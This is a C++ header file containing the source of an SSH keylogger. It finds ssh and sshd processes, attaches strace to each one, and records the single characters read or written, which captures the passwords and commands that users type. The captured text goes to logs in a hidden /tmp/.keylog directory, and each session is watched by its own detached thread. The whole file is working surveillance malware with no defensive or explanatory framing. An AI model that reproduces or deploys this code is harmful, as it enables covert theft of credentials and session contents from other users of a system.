#ifndef KEYLOGGER_KEYLOGGER_HPP
#define KEYLOGGER_KEYLOGGER_HPP

#include <iostream>
#include <cstring>
#include <thread>
#include <algorithm>
#include <fcntl.h>
#include <boost/regex.hpp>
#include <boost/filesystem.hpp>

#include "process.hpp"
#include "parsing.hpp"

namespace fs = boost::filesystem;

std::vector<Process> get_proc_list_of_ssh(){
    std::string command("ps -auxw");
    std::array<char, 128> buffer{};
    std::vector<Process> proc_list{};

    std::cout << "Opening reading PIPE from ps process output" << std::endl;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe)
    {
        std::cout << "Couldn't 'ps -auxw' command" << std::endl;
        return {};
    }
    fgets(buffer.data(), 128, pipe);
    while (fgets(buffer.data(), 128, pipe) != nullptr) {
        std::string proc_info{buffer.data()};
        if(proc_info.find("ssh") != std::string::npos){
            std::tuple<std::string, uint16_t, std::string, std::string> splitted_proc_info = parsing_utils::split_proc_info(proc_info);
            proc_list.emplace_back(Process{std::get<0>(splitted_proc_info),
                                           std::get<1>(splitted_proc_info),
                                           std::get<2>(splitted_proc_info),
                                           std::get<3>(splitted_proc_info)});
        }
    }
    auto returnCode = pclose(pipe);
    std::cout << "Closing PIPE return code: " << returnCode << std::endl;
    return proc_list;
}

void ssh_keylogger(const uint16_t& pid){
    std::cout << "Handling process(outgoing SSH) " << pid << std::endl;
    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
    FILE* pipe = popen(strace_cmd.c_str(), "r");
    if (!pipe)
    {
        std::cout << "Couldn't 'strace' command" << std::endl;
        return;
    }
    fs::path log_filename = "/tmp/.keylog";
    log_filename /= std::to_string(pid) + "_ssh.log";
    FILE *fd = std::fopen(log_filename.c_str(), "a+");
    if(!fd){
        std::cout << "Log-file error: " << log_filename << std::endl;
        return;
    }
    std::array<char, 256> buffer{};
    while(fgets(buffer.data(), 256, pipe) != nullptr){
        std::string data_from_strace{buffer.data()};
        if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
           data_from_strace.find("= 1\n") != std::string::npos){
            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>.*)\", 16384\\)\\s+= ");
            std::string symbol = parsing_utils::parse_strace_output(data_from_strace, xRegEx);
            std::cout << "SYMBOL: " << symbol << std::endl;
            std::fwrite(symbol.data(), 1, symbol.size(), fd);
        } else {
            continue;
        }
    }
    std::cout << "Connection is closed from PID = " << pid << std::endl;
    HandledProcesses& current_proc_list = HandledProcesses::getInstance();
    current_proc_list.del_from_proc_list(pid);
    pclose(pipe);
    std::fclose(fd);
}

void sshd_keylogger(const uint16_t& pid){
    std::cout << "Handling process(incoming SSH) " << pid << std::endl;
    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e write 2>&1";
    FILE* pipe = popen(strace_cmd.c_str(), "r");
    if (!pipe)
    {
        std::cout << "Couldn't 'strace' command" << std::endl;
        return;
    }
    fs::path log_filename = "/tmp/.keylog";
    log_filename /= std::to_string(pid) + "_sshd.log";
    FILE *fd = std::fopen(log_filename.c_str(), "a+");
    if(!fd){
        std::cout << "Log-file error: " << log_filename << std::endl;
        return;
    }
    std::array<char, 256> buffer{};
    while(fgets(buffer.data(), 256, pipe) != nullptr){
        std::string data_from_strace{buffer.data()};
        if(data_from_strace.find("write(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
           data_from_strace.find("= 1\n") != std::string::npos){
            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 16384\\)\\s+= 1");
            std::string symbol = parsing_utils::parse_strace_output(data_from_strace, xRegEx);
            std::cout << "SYMBOL: " << symbol << std::endl;
            std::fwrite(symbol.data(), 1, symbol.size(), fd);
        } else {
            continue;
        }
    }
    std::cout << "Connection is closed from PID = " << pid << std::endl;
    HandledProcesses& current_proc_list = HandledProcesses::getInstance();
    current_proc_list.del_from_proc_list(pid);
    pclose(pipe);
    std::fclose(fd);
}

void check_ps(){
    std::vector<Process> proc_list = get_proc_list_of_ssh();
    for (auto &proc : proc_list){
        if (proc.find_sshd()){
            HandledProcesses& obj = HandledProcesses::getInstance();
            auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
            if(it == obj.get_current_proc_list().end()){
                obj.get_current_proc_list().emplace_back(proc.get_pid());
                std::thread sshd_keylog(sshd_keylogger, proc.get_pid());
                sshd_keylog.detach();
            }
        }
        else if(proc.find_ssh()){
            HandledProcesses& obj = HandledProcesses::getInstance();
            auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
            if(it == obj.get_current_proc_list().end()){
                obj.get_current_proc_list().emplace_back(proc.get_pid());
                std::thread ssh_keylog(ssh_keylogger, proc.get_pid());
                ssh_keylog.detach();
            }
        }
    }
}

#endif //KEYLOGGER_KEYLOGGER_HPP
